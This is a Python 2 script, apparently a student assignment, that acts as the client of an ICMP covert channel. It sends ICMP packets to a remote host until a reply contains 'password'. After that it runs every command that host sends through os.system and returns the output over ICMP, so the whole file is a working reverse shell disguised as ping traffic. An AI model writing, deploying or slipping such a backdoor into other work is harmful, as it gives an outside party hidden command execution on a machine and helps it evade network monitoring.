#!/usr/bin/env python
# encoding: utf-8
#this is the client
""" 
"  A pure python ping implementation using raw socket.
"  ICMP messages can only be sent from processes running as root.
"""



#==================================================================#
'''
    most of this code was taken from the code
    from the 1st exercise from this assignment,
    ping.pyx.
    It already does most of what we need, so I 
    think there woudn't be necessary to rewrite
    it from scratch
'''
#==================================================================#

import os, sys, socket, struct, select, time, string, argparse,subprocess
ICMP_ECHO_REPLY = 0
parser = argparse.ArgumentParser(description='ping')
parser.add_argument('-b','--bind', type=str, default="10.0.24.8", help= 'where to bind')
parser.add_argument('-H', '--host', type=str, default="192.168.1.179", help='remote host')

args = parser.parse_args()


def checksum(source_string):
     sum = 0
     countTo = (len(source_string)/2)*2
     count = 0
     while count<countTo:
          thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
          sum = sum + thisVal
          sum = sum & 0xffffffff
          count = count + 2
     if countTo<len(source_string):
          sum = sum + ord(source_string[len(source_string) - 1])
          sum = sum & 0xffffffff
     sum = (sum >> 16)  +  (sum & 0xffff)
     sum = sum + (sum >> 16)
     answer = ~sum
     answer = answer & 0xffff
     answer = answer >> 8 | (answer << 8 & 0xff00)
     return answer
 
#this is recieve_one_ping modified
#it returns the optional data field from the icmp request
def receive_one_ping(my_socket, ID, timeout):
     timeLeft = timeout
     recPacket=''
     while True:
          startedSelect = time.time()
          whatReady = select.select([my_socket], [], [], timeLeft)
          howLongInSelect = (time.time() - startedSelect)
          if whatReady[0] == []:
                return None, recPacket[36:]
          timeReceived = time.time()
          recPacket, addr = my_socket.recvfrom(1024)
          icmpHeader = recPacket[20:28]
          type, code, checksum, packetID, sequence = struct.unpack(
                "bbHHh", icmpHeader)
          if packetID == ID:
                bytesInDouble = struct.calcsize("d")
                timeSent = struct.unpack("d", recPacket[28:28 + bytesInDouble])[0]
                return timeReceived - timeSent , recPacket[36:]
          timeLeft = timeLeft - howLongInSelect
          if timeLeft <= 0:
                return None,recPacket[36:]

 
#this is send_one_ping modified so that we can send any data we want 
def send_one_ping(my_socket, dest_addr, ID, data):
     dest_addr  =  socket.gethostbyname(dest_addr)
     my_checksum = 0
     header = struct.pack("bbHHh", ICMP_ECHO_REPLY, 0, my_checksum, ID, 1)
     bytesInDouble = struct.calcsize("d")
     data = struct.pack("d", time.time()) + data
     my_checksum = checksum(header + data)
     header = struct.pack(
          "bbHHh", ICMP_ECHO_REPLY, 0, socket.htons(my_checksum), ID, 1)
     packet = header + data
     my_socket.sendto(packet, (dest_addr, 1))
 
 
#this is "do_one" modified to only send
def send_one(dest_addr, timeout, data, bind):
     icmp = socket.getprotobyname("icmp")
     try:
          my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
          my_socket.bind((bind, 1))
     except socket.error, (errno, msg):
          if errno == 1:
                msg = msg + ( ": You have to be root.")
                raise socket.error(msg)
          raise
     my_ID = os.getpid() & 0xFFFF
     send_one_ping(my_socket, dest_addr, my_ID, data)
     #delay = receive_one_ping(my_socket, my_ID, timeout)
     delay = None
     my_socket.close()
     return delay

#this is "do_one" modified to only recieve
def recv_one(dest_addr, timeout, bind):
     icmp = socket.getprotobyname("icmp")
     try:
          my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
          my_socket.bind((bind, 1))
     except socket.error, (errno, msg):
          if errno == 1:
                msg = msg + ( ": You have to be root.")
                raise socket.error(msg)
          raise
     my_ID = os.getpid() & 0xFFFF
     #send_one_ping(my_socket, dest_addr, my_ID)
     delay, data = receive_one_ping(my_socket, my_ID, timeout)
     
     my_socket.close()
     return delay, data

def log_it(fd, msg):
     if (fd != 0):
          fd.write(msg)
     else:
          sys.stdout.write(msg)


def verbose_ping(dest_addr, bind):
    fd = 0
    timeout = 2
    x = 0
    while (not x):
        try:
            log_it(fd, "ping %s: " % dest_addr)
            try:
                #send a message and tests if it got the password bask
                send_one(dest_addr, timeout, "connected", bind)
                delay, data  =  recv_one(dest_addr, timeout, bind)
                #a very secure password
                if "password" in data:
                    x = 1
            except socket.gaierror, e:
                log_it(fd, "%s\n" % e[1])
                break
            if delay  !=  None:
               delay  =  delay * 1000
            time.sleep(1)
        except KeyboardInterrupt:
            break
    if (x == 1):
        print "Recieving data..."
        #we need our current working directory to create files based on absolute path
        os.system("pwd > .file")
        tmp = open (".file", "r")
        cwd = tmp.read()
        cwd = cwd[:-1]
        cwd = cwd + "/"
        tmp.close
        os.system("rm .file")
        send_one(dest_addr, timeout, "OK", bind)
        #the history of commands will be saved on this file
        #(we'll use os.system so we need a history)
        historyFile = open (cwd+".history", "w")
        historyFile.close()
        historyFile = open (cwd+".history", "r+")
        while True:
            delay, data  =  recv_one(dest_addr, timeout, bind)
            if "exit" in data:
                os.system("rm "+cwd+".history")
                os.system("rm "+cwd+".output")
                break
            if data:
                time.sleep(1)
                historyFile.seek(0, 0)
                cmd = historyFile.read()
                #because os.system only prints on the stdout, 
                #we save the output on a file and send the content of the file
                #it also send the stderr to this same file
                os.system(cmd+"("+data+") > "+cwd+".output 2>.output")
                file = open (cwd+".output", "r")
                output = file.read()
                file.close()
                #cd doesn't print anything, so we send this just to have a feeling
                #that it worked
                if "cd" in data:
                    output = output+'_' 
                send_one(dest_addr, timeout, output, bind)
                historyFile.write(data+ " ; ")
                data = 0                             
                




 
 
if __name__ == '__main__':
     h = args.host
     b = args.bind
     verbose_ping(h,b)
